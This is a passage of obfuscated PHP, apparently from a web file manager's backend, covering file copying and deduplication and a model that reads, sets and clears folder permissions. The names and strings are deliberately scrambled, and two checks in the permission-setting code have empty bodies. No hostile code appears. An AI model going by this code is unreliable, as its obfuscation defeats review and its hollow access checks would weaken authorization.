($ßÅ¿¥¿Õ) { $Ô‚¬Ü = $this->fileNameExistCache($¶ı€–õ«, $ù„ü«å•[$Ä¨íï·–[32]]); if ($Ô‚¬Ü) { if ($ù„ü«å•[$Ä¨íï·–[505]] || $ßÅ¿¥¿Õ == REPEAT_SKIP) { continue; } if ($ßÅ¿¥¿Õ == REPEAT_REPLACE) { $İòñÃ = $this->sourceInfoCache($Ô‚¬Ü); $£½Ğº‡ = $this->fileHistory($İòñÃ, $ù„ü«å•[$Ä¨íï·–[562]], $ù„ü«å•[$Ä¨íï·–[79]]); if ($£½Ğº‡) { $¡ôÙŒãÆ[$Ä¨íï·–[657]][] = $ù„ü«å•[$Ä¨íï·–[562]]; } continue; } else { if ($ßÅ¿¥¿Õ == REPEAT_RENAME) { $ù„ü«å•[$Ä¨íï·–[32]] = $this->fileNameAutoCache($¶ı€–õ«, $ù„ü«å•[$Ä¨íï·–[32]], $ßÅ¿¥¿Õ, !1); } } } } if (!$ù„ü«å•[$Ä¨íï·–[505]] && $ù„ü«å•[$Ä¨íï·–[562]] == 0) { continue; } if (!$ù„ü«å•[$Ä¨íï·–[505]] && $ù„ü«å•[$Ä¨íï·–[562]]) { $¡ôÙŒãÆ[$Ä¨íï·–[657]][] = $ù„ü«å•[$Ä¨íï·–[562]]; } $ò†ıÎ‰ë[] = $this->_makeItemData($ù„ü«å•, $óÑû¹—Ì, $ù„ü«å•[$Ä¨íï·–[32]]); } unset($ù„ü«å•); if (!empty($ò†ıÎ‰ë)) { $this->addAll($ò†ıÎ‰ë); $this->_childrenListSelect($¶ı€–õ«); } $½¤¡ ”ë = $this->_childrenList($¶ı€–õ«); $½¤¡ ”ë = array_to_keyvalue($½¤¡ ”ë, $Ä¨íï·–[32]); foreach ($š‹ªşñÀ as $ù„ü«å•) { $İòñÃ = $½¤¡ ”ë[$ù„ü«å•[$Ä¨íï·–[32]]]; $Ñè«ˆ£ó = $İòñÃ[$Ä¨íï·–[192]]; $this->_copyApplyMeta($İòñÃ, $¡ôÙŒãÆ); if ($ù„ü«å•[$Ä¨íï·–[33]] == $Ä¨íï·–[78]) { $ù„ü«å•[$Ä¨íï·–[87]] = $¿€Ÿï®˜->getPathInner($ù„ü«å•[$Ä¨íï·–[87]]); $this->_copyChildTo($¿€Ÿï®˜, $ù„ü«å•[$Ä¨íï·–[87]], $Ñè«ˆ£ó, $ßÅ¿¥¿Õ, $¡ôÙŒãÆ, $×ìÇÛœÙ, $ğÊ„¼ÄÉ); } } } private function _addFiles($¨±—ùúÌ, $œ‚¸¥‘…, $Å•ìÎ¢–, $¥î„¡€) { $é‹ö˜¦Š =& $_SERVER[áäÒ½¯Ç]; if (!$Å•ìÎ¢– || count($Å•ìÎ¢–) == 0) { return array(); } $üúøÖ  = array(); foreach ($Å•ìÎ¢– as &$éŞ‘·ª) { Hook::trigger($é‹ö˜¦Š[699], $éŞ‘·ª); $éŞ‘·ª[$é‹ö˜¦Š[87]] = $¨±—ùúÌ->getPathInner($éŞ‘·ª[$é‹ö˜¦Š[87]]); $ÉÒİæ = $¨±—ùúÌ->hashSimple($éŞ‘·ª[$é‹ö˜¦Š[87]]); $ç‰¾İ„Õ = $¨±—ùúÌ->hashMd5($éŞ‘·ª[$é‹ö˜¦Š[87]]); if (strlen($ç‰¾İ„Õ) > 10 && !isset($üúøÖ [$ç‰¾İ„Õ])) { $üúøÖ [$ç‰¾İ„Õ] = array(); } $éŞ‘·ª[$é‹ö˜¦Š[700]] = $ÉÒİæ; $éŞ‘·ª[$é‹ö˜¦Š[568]] = $ç‰¾İ„Õ; $üúøÖ [$ç‰¾İ„Õ][] =& $éŞ‘·ª; if (count($üúøÖ [$ç‰¾İ„Õ]) > 1) { $éŞ‘·ª[$é‹ö˜¦Š[698]] = !0; } Hook::trigger($é‹ö˜¦Š[701], $éŞ‘·ª); } unset($éŞ‘·ª); $Ïµ»‘¸´ = array($é‹ö˜¦Š[568] => array($é‹ö˜¦Š[7], array_keys($üúøÖ ))); $ó²šñÉí = Model($é‹ö˜¦Š[702]); $ÀúêÄ¶¤ = $ó²šñÉí->where($Ïµ»‘¸´)->select(); $ÀúêÄ¶¤ = $ÀúêÄ¶¤ ? $ÀúêÄ¶¤ : array(); foreach ($ÀúêÄ¶¤ as $¯¨öÃÌÙ) { if (!isset($üúøÖ [$¯¨öÃÌÙ[$é‹ö˜¦Š[568]]])) { continue; } $¥¨ø¶°È = $üúøÖ [$¯¨öÃÌÙ[$é‹ö˜¦Š[568]]]; foreach ($¥¨ø¶°È as &$éŞ‘·ª) { $éŞ‘·ª[$é‹ö˜¦Š[562]] = $¯¨öÃÌÙ[$é‹ö˜¦Š[562]]; $éŞ‘·ª[$é‹ö˜¦Š[698]] = !0; } unset($éŞ‘·ª); } $‚ŸÅš¼ã = array(); foreach ($Å•ìÎ¢– as $ä ¥ªˆ) { Hook::trigger($é‹ö˜¦Š[703], $ä ¥ªˆ); if (isset($ä ¥ªˆ[$é‹ö˜¦Š[698]]) && $ä ¥ªˆ[$é‹ö˜¦Š[698]]) { Hook::trigger($é‹ö˜¦Š[704], $ä ¥ªˆ); continue; } $ÍÑñéÙó = $¨±—ùúÌ->getPathInner($ä ¥ªˆ[$é‹ö˜¦Š[87]]); $Ò„±¿ÀÑ = $ó²šñÉí->addFileMake($ÍÑñéÙó, $œ‚¸¥‘…, $ä ¥ªˆ[$é‹ö˜¦Š[79]], $ä ¥ªˆ[$é‹ö˜¦Š[700]], $ä ¥ªˆ[$é‹ö˜¦Š[568]], $ä ¥ªˆ[$é‹ö˜¦Š[32]], $¥î„¡€); Hook::trigger($é‹ö˜¦Š[704], $ä ¥ªˆ); if (!is_array($Ò„±¿ÀÑ)) { continue; } $‚ŸÅš¼ã[] = $Ò„±¿ÀÑ; } $ó²šñÉí->addAll($‚ŸÅš¼ã); $Ïµ»‘¸´ = array($é‹ö˜¦Š[568] => array($é‹ö˜¦Š[7], array_keys($üúøÖ ))); $ÀúêÄ¶¤ = $ó²šñÉí->where($Ïµ»‘¸´)->select(); $ÀúêÄ¶¤ = $ÀúêÄ¶¤ ? $ÀúêÄ¶¤ : array(); foreach ($ÀúêÄ¶¤ as $¯¨öÃÌÙ) { if (!isset($üúøÖ [$¯¨öÃÌÙ[$é‹ö˜¦Š[568]]])) { continue; } $’Œ»± =& $üúøÖ [$¯¨öÃÌÙ[$é‹ö˜¦Š[568]]]; foreach ($’Œ»± as &$éŞ‘·ª) { $éŞ‘·ª[$é‹ö˜¦Š[562]] = $¯¨öÃÌÙ[$é‹ö˜¦Š[562]]; } unset($éŞ‘·ª); } $îı÷ˆ¼ş = array(); foreach ($Å•ìÎ¢– as $¡©ú×âñ) { $îı÷ˆ¼ş[$¡©ú×âñ[$é‹ö˜¦Š[32]]] = $¡©ú×âñ; } return $îı÷ˆ¼ş; } } define($_SERVER[áäÒ½¯Ç][705], $_SERVER[áäÒ½¯Ç][706]); $npvciyjbgd = $_SERVER[áäÒ½¯Ç][707]; goto aêáã˜±‹‘; fÂ‘àœÍÓ: class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\x5f\163\157\165\x72\143\x65\x5f\141\x75\164\x68"; public function getAuth($«†şÉûÈ) { $½òÚ³ğ™ =& $_SERVER[áäÒ½¯Ç]; $ŞíçÊÂ = $this->sourceAuthSelect($«†şÉûÈ); $µ×Ñ›°û = array(); $Ï¡Û«êü = array(); $šÅ‚¹†€ = 2 << 25; foreach ($ŞíçÊÂ as $şèÄ‰½…) { $‡÷Ü¼á = Model($½òÚ³ğ™[596])->listData($şèÄ‰½…[$½òÚ³ğ™[1589]]); if (!$‡÷Ü¼á) { continue; } $µ×Ñ›°û[] = $şèÄ‰½…; $üÎ¥ö¾ = 0; if ($şèÄ‰½…[$½òÚ³ğ™[189]] == SourceModel::TYPE_GROUP) { $üÎ¥ö¾ = $šÅ‚¹†€ * 2; } if ($şèÄ‰½…[$½òÚ³ğ™[189]] == SourceModel::TYPE_USER) { $üÎ¥ö¾ = $šÅ‚¹†€; } if ($şèÄ‰½…[$½òÚ³ğ™[189]] == SourceModel::TYPE_USER && $şèÄ‰½…[$½òÚ³ğ™[594]] == $½òÚ³ğ™[239]) { $üÎ¥ö¾ = 0; } $Ï¡Û«êü[] = $‡÷Ü¼á[$½òÚ³ğ™[507]] + $üÎ¥ö¾; } array_multisort($Ï¡Û«êü, SORT_DESC, $µ×Ñ›°û); return $µ×Ñ›°û; } public function sourceAuthSelect($âü¤ì®Ÿ) { $ùÊ‚¶İÉ =& $_SERVER[áäÒ½¯Ç]; static $‰Ïù°Ùà = array(); $ù’¸ÜµŠ = is_array($âü¤ì®Ÿ) ? !1 : !0; if ($ù’¸ÜµŠ) { $âü¤ì®Ÿ = array($âü¤ì®Ÿ); } $òƒÄ°à’ = array(); foreach ($âü¤ì®Ÿ as $»úôÌ¢) { if (isset($‰Ïù°Ùà[$»úôÌ¢])) { $òƒÄ°à’[$»úôÌ¢] = $‰Ïù°Ùà[$»úôÌ¢]; } } if (count($òƒÄ°à’) == count($âü¤ì®Ÿ)) { return $ù’¸ÜµŠ ? $òƒÄ°à’[$âü¤ì®Ÿ[0]] : $òƒÄ°à’; } $ï’…¦¶´ = $ùÊ‚¶İÉ[2316]; $ø¿¢–ø— = array($ùÊ‚¶İÉ[192] => array($ùÊ‚¶İÉ[7], $âü¤ì®Ÿ)); $¨õÍ»» = $this->field($ï’…¦¶´)->order($ùÊ‚¶İÉ[492])->where($ø¿¢–ø—)->select(); $ÚŞÆ˜âŒ = array_to_keyvalue_group($¨õÍ»», $ùÊ‚¶İÉ[192]); foreach ($âü¤ì®Ÿ as $»úôÌ¢) { $‰Ïù°Ùà[$»úôÌ¢] = $ÚŞÆ˜âŒ[$»úôÌ¢] ? $ÚŞÆ˜âŒ[$»úôÌ¢] : array(); } if ($ù’¸ÜµŠ) { return $¨õÍ»»; } return $ÚŞÆ˜âŒ; } public function setAuth($ÇäÌ‘Ø, $Ë¢ü†Ò¶) { $…°ä«óè =& $_SERVER[áäÒ½¯Ç]; $£ã­Ê¢ª = Model($…°ä«óè[1482])->sourceInfo($ÇäÌ‘Ø); if (!$£ã­Ê¢ª) { return !1; } if ($£ã­Ê¢ª[$…°ä«óè[189]] != SourceModel::TYPE_GROUP) { return !1; } $Š‰¸Îàî = 1; $‹×ó·¦ñ = $£ã­Ê¢ª[$…°ä«óè[594]]; if ($‹×ó·¦ñ != $Š‰¸Îàî) { $ãèÛƒºĞ = array($…°ä«óè[1444] => $‹×ó·¦ñ); $Ø—¡“”å = Model($…°ä«óè[2225])->field($…°ä«óè[1542])->where($ãèÛƒºĞ)->select(); $Ø—¡“”å = array_to_keyvalue($Ø—¡“”å, $…°ä«óè[12], $…°ä«óè[1542]); } $©¤«¥ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $ØõÍõ¬ï = array(); foreach ($Ë¢ü†Ò¶ as $Ê¤Á¯Ë¹) { if (!in_array($Ê¤Á¯Ë¹[$…°ä«óè[189]], $©¤«¥)) { show_json(LNG($…°ä«óè[2317]), !1); } if ($‹×ó·¦ñ != $Š‰¸Îàî) { if ($Ê¤Á¯Ë¹[$…°ä«óè[189]] == SourceModel::TYPE_GROUP) { } if ($Ê¤Á¯Ë¹[$…°ä«óè[594]] != 0 && !in_array($Ê¤Á¯Ë¹[$…°ä«óè[594]], $Ø—¡“”å)) { } } if ($Ê¤Á¯Ë¹[$…°ä«óè[594]] == 0) { $Ê¤Á¯Ë¹[$…°ä«óè[189]] = SourceModel::TYPE_USER; } $ØõÍõ¬ï[] = array($…°ä«óè[192] => $ÇäÌ‘Ø, $…°ä«óè[189] => intval($Ê¤Á¯Ë¹[$…°ä«óè[189]]), $…°ä«óè[594] => intval($Ê¤Á¯Ë¹[$…°ä«óè[594]]), $…°ä«óè[1589] => intval($Ê¤Á¯Ë¹[$…°ä«óè[1589]]) ? intval($Ê¤Á¯Ë¹[$…°ä«óè[1589]]) : 0, $…°ä«óè[2295] => intval($Ê¤Á¯Ë¹[$…°ä«óè[2295]]) ? intval($Ê¤Á¯Ë¹[$…°ä«óè[2295]]) : -1); } $this->where(array($…°ä«óè[511] => $ÇäÌ‘Ø))->delete(); $this->addAll($ØõÍõ¬ï); return !0; } public function authClear($îíù»öÉ) { $ÒÁÃÏ•´ =& $_SERVER[áäÒ½¯Ç]; $Ä‘º»ö = Model($ÒÁÃÏ•´[1482])->sourceInfo($îíù»öÉ); $Ç’ÙÓˆ = array($îíù»öÉ); if ($Ä‘º»ö[$ÒÁÃÏ•´[505]] == $ÒÁÃÏ•´[91]) { $›¬÷»¦à = array($ÒÁÃÏ•´[680] => array($ÒÁÃÏ•´[640], $Ä‘º»ö[$ÒÁÃÏ•´[609]] . $îíù»öÉ . $ÒÁÃÏ•´[641])); $Ç’ÙÓˆ = Model($ÒÁÃÏ•´[1482])->field($ÒÁÃÏ•´[511])->where($›¬÷»¦à)->getField($ÒÁÃÏ•´[192], !0); $Ç’ÙÓˆ[] = $îíù»öÉ; } $this->where(array($ÒÁÃÏ•´[511] => array($ÒÁÃÏ•´[512], $Ç’ÙÓˆ)))->delete(); return !0; } public function getAllParent($¡²Æ·è) { $öÒÂ’Øö =& $_SERVER[áäÒ½¯Ç]; $‹Œóøì³ = Model($öÒÂ’Øö[1482])->sourceInfo($¡²Æ·è); if (!$‹Œóøì³ || $‹Œóøì³[$öÒÂ’Øö[189]] != SourceModel::TYPE_GROUP) { return array(); } $Ö•ñ–ª˜ = Model($öÒÂ’Øö[1482])->parentLevelArray($‹Œóøì³[$öÒÂ’Øö[609]]); $ü€ä’ É = array_merge(array(intval($¡²Æ·è)), array_reverse($Ö•ñ–ª˜)); $ëû·îË‘ = $this->sourceAuthSelect($ü€ä’ É); $†ã­Õéè = $GLOBALS[$öÒÂ’Øö[6]][$öÒÂ’Øö[92]][$öÒÂ’Øö[2238]] == 1; $î¶ßË = $†ã­Õéè ? 3 : 2; $ıäÀ¡éƒ = Model($öÒÂ’Øö[1442])->getInfo($‹Œóøì³[$öÒÂ’Øö[594]]); $ËÆ–Ëš‰ = explode($öÒÂ’Øö[50], trim($ıäÀ¡éƒ[$öÒÂ’Øö[609]], $öÒÂ’Øö[50])); $°——’‰Ğ = array_merge(array($ıäÀ¡éƒ[$öÒÂ’Øö[1444]]), array_reverse(array_slice($ËÆ–Ëš‰, $î¶ßË))); foreach ($ëû·îË‘ as $¡²Æ·è => $ï‚Ğƒ½Ç) { foreach ($ï‚Ğƒ½Ç as $¢ˆãóú·) { if (!$¢ˆãóú· || !$¢ˆãóú·[$öÒÂ’Øö[594]] || $¢ˆãóú·[$öÒÂ’Øö[594]] == $öÒÂ’Øö[239]) { continue; } if ($¢ˆãóú·[$öÒÂ’Øö[189]] != SourceModel::TYPE_GROUP) { continue; } $°——’‰Ğ[] = $¢ˆãóú·[$öÒÂ’Øö[594]]; } } $°——’‰Ğ = array_unique($°——’‰Ğ); $õ¦ÊÒ ö = array($öÒÂ’Øö[438] => _get($GLOBALS[$öÒÂ’Øö[7]], $öÒÂ’Øö[438], 1), $öÒÂ’Øö[449] => _get($GLOBALS[$öÒÂ’Øö[7]], $öÒÂ’Øö[449], 500)); $GLOBALS[$öÒÂ’Øö[7]][$öÒÂ’Øö[438]] = 1; $GLOBALS[$öÒÂ’Øö[7]][$öÒÂ’Øö[449]] = 500; $ç÷“ — = array($öÒÂ’Øö[513] => 0, $öÒÂ’Øö[2139] => AuthModel::authAll(), $öÒÂ’Øö[514] => LNG($öÒÂ’Øö[2318]), $öÒÂ’Øö[2154] => $öÒÂ’Øö[2319]); $êÆĞİâ = array(); $ÙÁ‹´“ = explode($öÒÂ’Øö[50], $öÒÂ’Øö[2320]); $²âùıİ½ = explode($öÒÂ’Øö[50], $öÒÂ’Øö[2321]); foreach ($°——’‰Ğ as $‡³Ÿ…ñŞ) { $Š¬Öø§ = Model($öÒÂ’Øö[1442])->getInfo($‡³Ÿ…ñŞ); $¼ìÖÄ‰ = array_field_key($Š¬Öø§, $ÙÁ‹´“); $é’å”‡‡ = Model($öÒÂ’Øö[622])->listByGroup($‡³Ÿ…ñŞ); foreach ($é’å”‡‡[$öÒÂ’Øö[455]] as $„Å”çØŒ => $ÏŸÏÉ´ı) { $this->userGroupList($ÏŸÏÉ´ı[$öÒÂ’Øö[1542]], $ÏŸÏÉ´ı); $·©‡ÇÑî = $ÏŸÏÉ´ı[$öÒÂ’Øö[1542]] . $öÒÂ’Øö[12]; if (isset($êÆĞİâ[$·©‡ÇÑî])) { continue; } $äÅ‹ËÌì = Model($öÒÂ’Øö[2322])->listData($ÏŸÏÉ´ı[$öÒÂ’Øö[2323]]); $ÏŸÏÉ´ı[$öÒÂ’Øö[2324]] = Action($öÒÂ’Øö[2325])->parseUrl($ÏŸÏÉ´ı[$öÒÂ’Øö[2324]]); $ÏŸÏÉ´ı[$öÒÂ’Øö[1892]] = $äÅ‹ËÌì && $äÅ‹ËÌì[$öÒÂ’Øö[2326]] == 1; $ö¡«•É = $this->groupRootAuth($‡³Ÿ…ñŞ, $ÏŸÏÉ´ı[$öÒÂ’Øö[1542]]); $ö¡«•É = $ÏŸÏÉ´ı[$öÒÂ’Øö[1892]] ? $ç÷“ — : $ö¡«•É; $êÆĞİâ[$·©‡ÇÑî] = array($öÒÂ’Øö[2327] => $öÒÂ’Øö[2328], $öÒÂ’Øö[2329] => LNG($öÒÂ’Øö[2330]), $öÒÂ’Øö[2307] => array_field_key($ÏŸÏÉ´ı, $²âùıİ½), $öÒÂ’Øö[507] => $ö¡«•É, $öÒÂ’Øö[508] => $ö¡«•É[$öÒÂ’Øö[507]], $öÒÂ’Øö[2331] => $¼ìÖÄ‰); } } $GLOBALS[$öÒÂ’Øö[7]][$öÒÂ’Øö[438]] = $õ¦ÊÒ ö[$öÒÂ’Øö[438]]; $GLOBALS[$öÒÂ’Øö[7]][$öÒÂ’Øö[449]] = $õ¦ÊÒ ö[$öÒÂ’Øö[449]]; foreach ($ëû·îË‘ as $¡²Æ·è => $ï‚Ğƒ½Ç) { if (!$ï‚Ğƒ½Ç) { continue; } foreach ($ï‚Ğƒ½Ç as $¢ˆãóú·) { if (!$¢ˆãóú· || !$¢ˆãóú·[$öÒÂ’Øö[594]] || $¢ˆãóú·[$öÒÂ’Øö[594]] == $öÒÂ’Øö[239]) { continue; } if ($¢ˆãóú·[$öÒÂ’Øö[189]] != SourceModel::TYPE_USER) { continue; } $·©‡ÇÑî = $¢ˆãóú·[$öÒÂ’Øö[594]] . $öÒÂ’Øö[12]; if (isset($êÆĞİâ[$·©‡ÇÑî])) { continue; } $Ë’Ë›÷æ = $this->authMake($ï‚Ğƒ½Ç, $·©‡ÇÑî); if (!$Ë’Ë›÷æ || !$Ë’Ë›÷æ[$öÒÂ’Øö[2329]]) { continue; } $êÆĞİâ[$·©‡ÇÑî] = array($öÒÂ’Øö[2327] => $öÒÂ’Øö[2332], $öÒÂ’Øö[2329] => $Ë’Ë›÷æ[$öÒÂ’Øö[2329]], $öÒÂ’Øö[2307] => Model($öÒÂ’Øö[622])->getInfoSimpleOuter($·©‡ÇÑî), $öÒÂ’Øö[507] => $Ë’Ë›÷æ[$öÒÂ’Øö[561]], $öÒÂ’Øö[508] => $Ë’Ë›÷æ[$öÒÂ’Øö[561]][$öÒÂ’Øö[507]], $öÒÂ’Øö[2331] => $Ë’Ë›÷æ[$öÒÂ’Øö[2333]]); } } foreach ($ëû·îË‘ as $¡²Æ·è => $ï‚Ğƒ½Ç) { if (!$ï‚Ğƒ½Ç) { continue; } foreach ($êÆĞİâ as $·©‡ÇÑî => $·­ÃÃ¡û) { if ($·­ÃÃ¡û[$öÒÂ’Øö[2307]][$öÒÂ’Øö[1892]] || $·­ÃÃ¡û[$öÒÂ’Øö[2327]] == $öÒÂ’Øö[2332]) { continue; } $Ë’Ë›÷æ = $this->authMake($ï‚Ğƒ½Ç, $·©‡ÇÑî); if (!$Ë’Ë›÷æ || !$Ë’Ë›÷æ[$öÒÂ’Øö[2329]]) { continue; } $êÆĞİâ[$·©‡ÇÑî] = array($öÒÂ’Øö[2327] => $öÒÂ’Øö[2332], $öÒÂ’Øö[2329] => $Ë’Ë›÷æ[$öÒÂ’Øö[2329]], $öÒÂ’Øö[2307] => $·­ÃÃ¡û[$öÒÂ’Øö[2307]], $öÒÂ’Øö[507] => $Ë’Ë›÷æ[$öÒÂ’Øö[561]], $öÒÂ’Øö[508] => $Ë’Ë›÷æ[$öÒÂ’Øö[561]][$öÒÂ’Øö[507]], $öÒÂ’Øö[2331] => $Ë’Ë›÷æ[$öÒÂ’Øö[2333]]); } } $êÆĞİâ = array_sort_by($êÆĞİâ, $öÒÂ’Øö[508], $öÒÂ’Øö[545]); return $êÆĞİâ; } public function getAllChildren($±Ø°‹ñŞ) { $õƒ·Ğ÷ =& $_SERVER[áäÒ½¯Ç]; $æàÔîÒü = Model($õƒ·Ğ÷[1482])->sourceInfo($±Ø°‹ñŞ); if ($æàÔîÒü[$õƒ·Ğ÷[505]] != $õƒ·Ğ÷[91]) { return $this->sourceListAuth(array($±Ø°‹ñŞ)); } if ($æàÔîÒü[$õƒ·Ğ÷[189]] != SourceModel::TYPE_GROUP) { return array(); } $”…ÂØ´Ò = 1; $Ñä¥°İ = array($±Ø°‹ñŞ); if ($æàÔîÒü[$õƒ·Ğ÷[191]] == $õƒ·Ğ÷[239] && $æàÔîÒü[$õƒ·Ğ÷[594]] != $”…ÂØ´Ò) { $Ñä¥°İ = $this->groupChidldAllRootSource($æàÔîÒü[$õƒ·Ğ÷[594]]); } $‰™®Î‡Ş = $this->field($õƒ·Ğ÷[192])->group($õƒ·Ğ÷[192])->select(); $‰™®Î‡Ş = array_to_keyvalue($‰™®Î‡Ş, $õƒ·Ğ÷[12], $õƒ·Ğ÷[192]); if (!$‰™®Î‡Ş) { return array(); } $ö¢Ş›Ù½ = $õƒ·Ğ÷[2334]; $ÙõôîŠÅ = array($õƒ·Ğ÷[192] => array($õƒ·Ğ÷[7], $‰™®Î‡Ş), $õƒ·Ğ÷[525] => $õƒ·Ğ÷[239]); $ÇæÚ¨¨ = Model($õƒ·Ğ÷[935])->field($ö¢Ş›Ù½)->where($ÙõôîŠÅ)->select(); $¿®¼ àø = array($±Ø°‹ñŞ); foreach ($ÇæÚ¨¨ as $»™êÏªÄ) { foreach ($Ñä¥°İ as $ÑÀÉŒû) { $ÏÎÊã¬õ = $õƒ·Ğ÷[50] . $ÑÀÉŒû . $õƒ·Ğ÷[50]; $†ìÖşÚô = $»™êÏªÄ[$õƒ·Ğ÷[609]] . $»™êÏªÄ[$õƒ·Ğ÷[192]] . $õƒ·Ğ÷[50]; if (strstr($†ìÖşÚô, $ÏÎÊã¬õ)) { $¿®¼ àø[] = $»™êÏªÄ[$õƒ·Ğ÷[192]]; break; } } } return $this->sourceListAuth($¿®¼ àø); } private function sourceListAuth($˜³§·âÎ) { $Ä§ó»Û‡ =& $_SERVER[áäÒ½¯Ç]; $’œ¬šø = Model($Ä§ó»Û‡[1482])->sourceListInfo($˜³§·âÎ, !0); $îÅúÑ­Ü = $this->sourceAuthSelect($˜³§·âÎ); $áÛúÙÁ“ = array(); $¨ºú÷€ä = array(); foreach ($’œ¬šø as $µÕÕ»‡È) { unset($µÕÕ»‡È[$Ä§ó»Û‡[548]]); unset($µÕÕ»‡È[$Ä§ó»Û‡[546]]); unset($µÕÕ»‡È[$Ä§ó»Û‡[507]]); unset($µÕÕ»‡È[$Ä§ó»Û‡[90]]); $Â©øû—½ = $îÅúÑ­Ü[$µÕÕ»‡È[$Ä§ó»Û‡[192]]]; if (!$Â©øû—½) { continue; } $µÕÕ»‡È[$Ä§ó»Û‡[2331]] = $this->authTargetInfo($Â©øû—½); $µÕÕ»‡È[$Ä§ó»Û‡[607]] = rtrim($µÕÕ»‡È[$Ä§ó»Û‡[613]], $Ä§ó»Û‡[8]) . $Ä§ó»Û‡[8] . ltrim($µÕÕ»‡È[$Ä§ó»Û‡[607]], $Ä§ó»Û‡[8]); $áÛúÙÁ“[] = $µÕÕ»‡È; $šñ³¥×¶ = count(explode($Ä§ó»Û‡[8], trim($µÕÕ»‡È[$Ä§ó»Û‡[607]], $Ä§ó»Û‡[8]))); $¨ºú÷€ä[] = $šñ³¥×¶ + ($µÕÕ»‡È[$Ä§ó»Û‡[33]] == $Ä§ó»Û‡[78] ? 0 : 1000); } array_multisort($¨ºú÷€ä, SORT_ASC, $áÛúÙÁ“); return $áÛúÙÁ“; } private function groupChidldAllRootSource($æ•ƒø«) { $—´öò› =& $_SERVER[áäÒ½¯Ç]; $Ğã¥ÓÂ¯ = Model($—´öò›[1442])->groupChildrenAll($æ•ƒø«); $ßİ‚âÏ„ = array($—´öò›[191] => 0, $—´öò›[594] => array($—´öò›[7], $Ğã¥ÓÂ¯), $—´öò›[189] => SourceModel::TYPE_GROUP); $Œ‚ÓÊşÛ = Model($—´öò›[935])->field($—´öò›[192])->where($ßİ‚âÏ„)->select(); $Œ‚ÓÊşÛ = array_to_keyvalue($Œ‚ÓÊşÛ, $—´öò›[12], $—´öò›[192]); return $Œ‚ÓÊşÛ; } private function authTargetInfo($±ŠêÒ‹¹) { $áú“†ûä =& $_SERVER[áäÒ½¯Ç]; $úÒâİ = array(); $ÜÒ´¢é² = array(); $òıß¹¾ = 2 << 25; foreach ($±ŠêÒ‹¹ as $ºœÓ ¼) { $÷ßèá®Á = Model($áú“†ûä[596])->listData($ºœÓ ¼[$áú“†ûä[1589]]); if (!$÷ßèá®Á) { continue; } if ($ºœÓ ¼[$áú“†ûä[189]] == SourceModel::TYPE_USER) { $ˆş‹ŒÖ = Model($áú“†ûä[602])->getInfoSimpleOuter($ºœÓ ¼[$áú“†ûä[594]]); if ($ˆş‹ŒÖ[$áú“†ûä[1542]] == $áú“†ûä[1326]) { continue; } if ($ˆş‹ŒÖ[$áú“†ûä[1542]] == $áú“†ûä[239]) { $ˆş‹ŒÖ[$áú“†ûä[32]] = LNG($áú“†ûä[2335]); } } else { $ˆş‹ŒÖ = Model($áú“†ûä[610])->getInfoSimple($ºœÓ ¼[$áú“†ûä[594]]); } if (!$ˆş‹ŒÖ) { continue; } $ˆş‹ŒÖ[$áú“†ûä[561]] = $÷ßèá®Á; $úÒâİ[] = $ˆş‹ŒÖ; $éíÏÀ¯ = 0; if ($ºœÓ ¼[$áú“†ûä[189]] == SourceModel::TYPE_GROUP) { $éíÏÀ¯ = $òıß¹¾ * 2; } if ($ºœÓ ¼[$áú“†ûä[189]] == SourceModel::TYPE_USER) { $éíÏÀ¯ = $òıß¹¾; } if ($ºœÓ ¼[$áú“†ûä[189]] == SourceModel::TYPE_USER && $ºœÓ ¼[$áú“†ûä[594]] == $áú“†ûä[239]) { $éíÏÀ¯ = 0; } $ÜÒ´¢é²[] = $÷ßèá®Á[$áú“†ûä[507]] + $éíÏÀ¯; } array_multisort($ÜÒ´¢é², SORT_DESC, $úÒâİ); return $úÒâİ; } public function getAllChildrenByUser($Ã›±ø…à, $ÁÉ¡†øÃ) { $²Ã£ß©ñ =& $_SERVER[áäÒ½¯Ç]; $³ÏåçÎü = Model($²Ã£ß©ñ[622])->getInfo($ÁÉ¡†øÃ); if (!$ÁÉ¡†øÃ || !$Ã›±ø…à || !$³ÏåçÎü) { return array(); } $ş¢å‚Ÿ¢ = Model($²Ã£ß©ñ[1482])->sourceInfo($Ã›±ø…à); $ÑæßêÁù = array(); $ªàƒÇ¦¡ = 1; if ($ş¢å‚Ÿ¢[$²Ã£ß©ñ[191]] == $²Ã£ß©ñ[239] && $ş¢å‚Ÿ¢[$²Ã£ß©ñ[594]] != $ªàƒÇ¦¡ && $this->groupContainUser($ş¢å‚Ÿ¢[$²Ã£ß©ñ[594]], $ÁÉ¡†øÃ)) { foreach ($³ÏåçÎü[$²Ã£ß©ñ[1443]] as $°Ô“’¾…) { $úÎ·éÔ¿ = Model($²Ã£ß©ñ[610])->getInfo($°Ô“’¾…[$²Ã£ß©ñ[1444]]); $şÆª×·× = Model($²Ã£ß©ñ[622])->getInfoSimpleOuter($ÁÉ¡†øÃ); $şÆª×·×[$²Ã£ß©ñ[561]] = $°Ô“’¾…[$²Ã£ß©ñ[507]]; if (Model($²Ã£ß©ñ[596])->authCheckAction($°Ô“’¾…[$²Ã£ß©ñ[507]][$²Ã£ß©ñ[507]], $²Ã£ß©ñ[1514])) { continue; } $ÊÙ¯µıŒ = array($²Ã£ß©ñ[32] => $²Ã£ß©ñ[1345] . $úÎ·éÔ¿[$²Ã£ß©ñ[32]], $²Ã£ß©ñ[192] => $úÎ·éÔ¿[$²Ã£ß©ñ[90]][$²Ã£ß©ñ[192]], $²Ã£ß©ñ[87] => KodIO::make($úÎ·éÔ¿[$²Ã£ß©ñ[90]][$²Ã£ß©ñ[192]]), $²Ã£ß©ñ[191] => $²Ã£ß©ñ[239], $²Ã£ß©ñ[189] => $²Ã£ß©ñ[603], $²Ã£ß©ñ[33] => $²Ã£ß©ñ[644], $²Ã£ß©ñ[607] => $úÎ·éÔ¿[$²Ã£ß©ñ[614]], $²Ã£ß©ñ[1444] => $úÎ·éÔ¿[$²Ã£ß©ñ[1444]], $²Ã£ß©ñ[611] => $úÎ·éÔ¿[$²Ã£ß©ñ[191]], $²Ã£ß©ñ[2331] => array($şÆª×·×)); $ÑæßêÁù[$ÊÙ¯µıŒ[$²Ã£ß©ñ[192]]] = $ÊÙ¯µıŒ; } } $½ÁÑóè• = array(); $ÍÕñÂ«™ = $this->getAllChildren($Ã›±ø…à); foreach ($ÍÕñÂ«™ as $’§ÛåËĞ) { $Ä°Ú²¸¤ = !1; foreach ($’§ÛåËĞ[$²Ã£ß©ñ[2331]] as $·ö›©İ) { if 